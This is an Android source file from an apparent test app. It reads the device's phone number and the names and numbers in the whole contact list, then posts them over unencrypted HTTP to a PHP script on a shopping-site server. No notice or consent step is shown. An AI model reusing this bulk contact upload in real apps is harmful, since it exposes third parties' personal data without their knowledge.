package betheracer.devincontactstest2;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.List;



public class MainActivity extends AppCompatActivity {

    String host_number;
    String contacts;


    TextView textView;

    MyThread workThread;

    TelephonyManager manager;
    public static final int REQUEST_CODE_READ_PHONE_STATE = 101;
    public static final int REQUEST_CODE_READ_CONTACTS = 102;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.textView);

        manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

                requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE},
                        REQUEST_CODE_READ_PHONE_STATE);
            } else {
                ///////////////// get phone Number : start //////////////////
                host_number = manager.getLine1Number();

                if(host_number.startsWith("+82")) {
                    host_number=host_number.replace("+82", "0");
                }
                ///////////////// get phone Number : end  //////////////////
            }
        } else {
            ///////////////// get phone Number : start //////////////////
            host_number = manager.getLine1Number();

            if(host_number.startsWith("+82")) {
                host_number=host_number.replace("+82", "0");
            }
            ///////////////// get phone Number : end  //////////////////
        }


        textView.setText(host_number);


        Button button1 = (Button) findViewById(R.id.button1);
        button1.setOnClickListener(new View.OnClickListener() {
            @SuppressLint("NewApi")
            @Override
            public void onClick(View v) {

                String phoneNumber = null;
                StringBuffer sb = new StringBuffer();
                String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
                ContentResolver cr = getContentResolver();

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {

                        requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},
                                REQUEST_CODE_READ_CONTACTS);
                    } else {

                        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                                null, null, null, null);

                        if (cur.getCount() > 0) {
                            while (cur.moveToNext()) {
                                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                    //message.append("\nNAME:" + name);
                                    sb.append(name + "|");

                                    //Cursor pCur = cr.query(
                                    //        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    //        null,
                                    //        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    //        new String[]{id}, null);
                                    Cursor pCur = cr.query(
                                            ContactsContract.Data.CONTENT_URI,
                                            null,
                                            ContactsContract.Data.CONTACT_ID + "=?" + " AND " + ContactsContract.Data.MIMETYPE + "='"
                                                    + ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "'",
                                            new String[]{id}, null);
                                    while (pCur.moveToNext()) {
                                        phoneNumber = pCur.getString(pCur
                                                .getColumnIndex(NUMBER));
                                        //message.append("\nPHONE NUMBER:" + phoneNumber);
                                        sb.append(phoneNumber + "|");
                                    }
                                    pCur.close();
                                }
                                //message.append("\n\n");
                                sb.append("||");
                            }
                        }
                        workThread = new MyThread(sb, host_number);
                        workThread.start();
                    }
                } else {

                    Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                            null, null, null, null);

                    if (cur.getCount() > 0) {
                        while (cur.moveToNext()) {
                            String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                            String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                            if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                                //message.append("\nNAME:" + name);
                                sb.append(name + "|");

                                //Cursor pCur = cr.query(
                                //        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                //        null,
                                //        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                //        new String[]{id}, null);
                                Cursor pCur = cr.query(
                                        ContactsContract.Data.CONTENT_URI,
                                        null,
                                        ContactsContract.Data.CONTACT_ID + "=?" + " AND " + ContactsContract.Data.MIMETYPE + "='"
                                                + ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "'",
                                        new String[]{id}, null);
                                while (pCur.moveToNext()) {
                                    phoneNumber = pCur.getString(pCur
                                            .getColumnIndex(NUMBER));
                                    //message.append("\nPHONE NUMBER:" + phoneNumber);
                                    sb.append(phoneNumber + "|");
                                }
                                pCur.close();
                            }
                            //message.append("\n\n");
                            sb.append("||");
                        }
                    }
                    workThread = new MyThread(sb, host_number);
                    workThread.start();
                }



            }
        });


    }




    class MyThread extends Thread {

        StringBuffer buffer = new StringBuffer();
        String contacts;
        String host_number;

        public MyThread(StringBuffer sb, String hostNumber) {
            buffer = sb;
            host_number = hostNumber;
        }

        public void run() {

            contacts = buffer.toString();

            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
            HttpClient httpclient = new DefaultHttpClient();

            //HttpPost httppost = new HttpPost("http://192.168.0.16/shop/android/test8.php?start_debug=1&send_sess_end=1&debug_start_session=1&debug_session_id=12801&debug_port=10137&debug_host=192.168.109.1%2C127.0.0.1");
            //HttpPost httppost = new HttpPost("http://192.168.0.16/shop/android/test8.php");
            HttpPost httppost = new HttpPost("http://iblind2.godo.co.kr/shop/android/test8.php");
            HttpResponse response = null;

            try {
                nameValuePairs.add(new BasicNameValuePair("myNumber", host_number));
                nameValuePairs.add(new BasicNameValuePair("contacts", contacts));

                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs, "EUC-KR"));
                response = httpclient.execute(httppost);
            }catch (Exception e) {
                e.printStackTrace();
            }




        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {

        if (requestCode == REQUEST_CODE_READ_PHONE_STATE) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                ///////////////// get phone Number : start //////////////////
                host_number = manager.getLine1Number();

                if(host_number.startsWith("+82")) {
                    host_number=host_number.replace("+82", "0");
                }
                ///////////////// get phone Number : end  //////////////////

            } else {
                Toast.makeText(this, "READ PHONE STATE 권한 필수", Toast.LENGTH_SHORT).show();
            }
        }

        if (requestCode == REQUEST_CODE_READ_CONTACTS) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "READ CONTACTS 권한이 허용되었습니다.\n다시 한번 버튼을 눌러주세요", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "READ CONTACTS 권한 필수", Toast.LENGTH_SHORT).show();
            }
        }

    }


}



